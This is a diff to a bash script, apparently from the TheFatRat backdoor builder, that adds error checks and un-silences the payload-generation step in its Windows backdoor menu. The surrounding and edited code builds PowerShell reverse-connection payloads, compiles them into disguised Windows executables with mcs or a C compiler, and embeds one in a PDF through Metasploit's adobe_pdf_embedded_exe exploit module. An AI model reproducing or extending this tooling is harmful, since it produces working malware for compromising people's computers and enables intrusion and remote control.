@@ -78,6 +78,7 @@ publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
 hostn=`host $publicip | awk '{print $5}'`
 list=$path/config/listeners
 log=$path/logs/apk-old.log
+pwind=$path/logs/pwind.log
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -1895,13 +1896,33 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+                                        $pwned $payload $yourip $yourport 
 					echo ""
 					echo ""
+                                        power=$path/powershell_attack.txt
+                                        if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find the output $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					cat powershell_attack.txt
 					sleep 2
 					rm unicorn.rc
 					mv powershell_attack.txt output/$fira.bat
+                                        otf=$path/output/$fira.bat
+                                        if [ ! -f "$otf" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to create $otf"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					echo ""
 					echo -e $okegreen""
 					echo -e "Backdoor Saved To output Folder "
@@ -1929,10 +1950,19 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					$pwned $payload $yourip $yourport 
 					echo ""
 					echo ""
-
+power=$path/powershell_attack.txt
+                                        if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find the output $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
 					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
@@ -1941,7 +1971,27 @@ echo -e $okegreen ""
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $B > $bcom
 					echo
+powerf=$path/output/Program.cs
+                                        if [ ! -f "$powerf" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find the output $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
+power=$path/output/$fira.exe
+                                        if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to compile with mono $powerf into $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					rm unicorn.rc powershell_attack.txt $bcom
 					sleep 2
 					echo ""
@@ -1977,7 +2027,7 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					$pwned $payload $yourip $yourport
 					echo ""
 					echo $yourip >> "$out"
 
@@ -1987,6 +2037,16 @@ echo -e $okegreen ""
 					echo
 					$COMPILER -Wall -mwindows icons/icon.res $apachecom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc  $apachecom $out
+power=$path/powershell_attack.txt
+                                        if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					mv powershell_attack.txt $apache2
 					sleep 2
 					echo ""
@@ -2020,10 +2080,19 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					$pwned $payload $yourip $yourport
 					echo ""
 					echo ""
-
+power=$path/powershell_attack.txt
+                                        if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
 					s2=$(cat powershell_attack.txt | cut -d ' ' -f3)
@@ -2032,6 +2101,15 @@ echo -e $okegreen ""
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $paycom
 					echo
+                                        if [ ! -f "$paycom" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find $paycom"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					$COMPILER -Wall -mwindows icons/icon.res $paycom -o "output/$fira.exe" > /dev/null 2>&1
 					rm unicorn.rc powershell_attack.txt $paycom
 					sleep 2
@@ -2069,9 +2147,19 @@ echo -e $okegreen ""
 					gboor
 					spinlong
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
+					$pwned $payload $yourip $yourport
 					echo ""
 					echo ""
+power=$path/powershell_attack.txt
+if [ ! -f "$power" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find $power"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 
 					s0=$(cat powershell_attack.txt | cut -d ' ' -f1)
 					s1=$(cat powershell_attack.txt | cut -d ' ' -f2)
@@ -2081,11 +2169,30 @@ echo -e $okegreen ""
 
 					sed s/PAYLOAD/$s0\ $s1\ $s2\ $s3\ $s4/g $C > $pdfcom
 					echo
+if [ ! -f "$pdfcom" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Unable to find $pdfcom"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					$COMPILER -Wall -mwindows icons/icon.res $pdfcom -o "$path/output/backdoor_for_pdf.exe" > /dev/null 2>&1
 					sleep 2
 					echo " Wait for embed exe to pdf ....  "
 					xterm -T " TheFatRat < PDF BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $path/output/backdoor_for_pdf.exe; set FILENAME $fira.pdf; set INFILENAME $embedpdf; exploit; exit -y'" > /dev/null 2>&1
 					echo ""
+msout=~/.msf4/local/$fira.pdf
+if [ ! -f "$msout" ]
+                                        then
+                                        echo -e $red ""
+                                        echo "Msfconsole was unale to compile $fira.pdf"
+                                        echo -e $okegreen ""
+read -rsp $'Press any key to return to return to menu\n' -n 1 key
+clear
+PwnWinds
+fi
 					mv ~/.msf4/local/$fira.pdf $path/output/$fira.pdf
 					rm unicorn.rc powershell_attack.txt
 					echo -e $okegreen""
